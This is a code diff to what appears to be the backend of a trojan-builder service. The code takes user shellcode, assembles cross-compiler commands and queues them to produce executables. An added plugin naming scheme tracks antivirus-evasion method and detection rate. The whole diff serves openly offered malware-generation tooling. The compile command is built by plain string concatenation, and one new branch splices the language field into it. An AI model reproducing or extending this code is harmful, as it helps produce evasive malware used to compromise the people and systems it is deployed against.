@@ -29,7 +29,7 @@ Language2Command={
                     "dll": "x86_64-w64-mingw32-gcc -fPIC -shared -o "
                 }
             },
-            "c++":
+            "cpp":
             {
                 "x86":
                 {
@@ -93,6 +93,10 @@ def CompileCode(Command):#代码编译处理函数
 }
 """
 def GetTrojanPlugins(request):#获取用户当前木马插件
+    """
+    插件命名格式
+    语言-目标程序格式-目标系统-加密方式-是否需要shellcode-免杀方式-编写时间-查杀率
+    """
     RequestLogRecord(request, request_api="get_trojan_plugins")
     if request.method == "POST":
         try:
@@ -169,17 +173,22 @@ def ShellcodeToTrojan(request):#shellcode转换生成病毒
                                 Command=Language2Command["linux"][ScriptModule.__language__.split('.')[1]][ShellcodeArchitecture][ScriptModule.__process__.split('.')[1]]#通过文件中的语言类型和生成文件进行提取命令
                                 if Command==None:
                                     return JsonResponse({'message': "呐呐呐！该种组合无法进行编译，请使用其他插件~", 'code': 450, })
-                                else:
-                                    CompleteCommand=Command + VirusFileGenerationPath +" "+VirusOriginalFilePath #进行命令拼接
-                                    RedisCompileCodeTask=CompileCode.delay(CompleteCommand)
-                                    TrojanData().Write(uid=Uid, shellcode_type=ShellcodeType,
+                                elif len(ScriptModule.__language__)>0:#判断有没有在原始编译命令上新增的编译操作
+                                    if Command.find(" -o ")!=-1:#提取输出命令
+                                        Command=Command.replace(" -o "," "+ScriptModule.__language__+" -o ")
+                                    elif Command.find(" --out:")!=-1:#提取输出命令
+                                        Command = Command.replace(" --out:", " " + ScriptModule.__language__ + " --out:")
+
+                                CompleteCommand=Command + VirusFileGenerationPath +" "+VirusOriginalFilePath #进行命令拼接
+                                RedisCompileCodeTask=CompileCode.delay(CompleteCommand)
+                                TrojanData().Write(uid=Uid, shellcode_type=ShellcodeType,
                                                        trojan_original_file_name=RandomName + ScriptModule.__language__,
                                                        trojan_generate_file_name=RandomName + ScriptModule.__process__, compilation_status="0",
                                                        redis_id=RedisCompileCodeTask.task_id,
                                                        shellcode_architecture=ShellcodeArchitecture,
                                                        plugin=ScriptModule.__heading__)
 
-                                    return JsonResponse({'message': "宝贝任务已下发~", 'code': 200, })
+                                return JsonResponse({'message': "宝贝任务已下发~", 'code': 200, })
                         else:
                             return JsonResponse({'message': "你的电脑不是Mac或者Linux无法使用该功能ლ(•̀ _ •́ ლ)", 'code': 600, })
                     except Exception as e:
